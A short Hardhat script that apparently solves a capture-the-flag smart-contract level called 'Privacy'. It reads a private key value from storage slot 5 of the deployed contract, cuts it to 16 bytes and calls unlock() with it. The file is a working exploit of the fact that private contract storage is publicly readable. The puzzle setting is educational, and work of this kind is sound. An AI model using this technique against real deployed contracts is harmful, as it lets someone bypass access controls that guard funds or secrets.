import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x1F708C24a0D3A740cD47cC0444E9480899f3dA7D"
const PLAYER_ADDRESS = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199"

async function main() {

    const signer = await ethers.getSigner(PLAYER_ADDRESS)
    const contract = await ethers.getContractAt("Privacy", CONTRACT_ADDRESS, signer)

    const keyData = await contract.provider.getStorageAt(contract.address, 5)
    const key16 = `${keyData.slice(0, 34)}` // bytes16 = 16 bytes = 32 hex chars, +2 for 0x prefix
    console.log(key16);
    await contract.unlock(key16)
    
}



// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });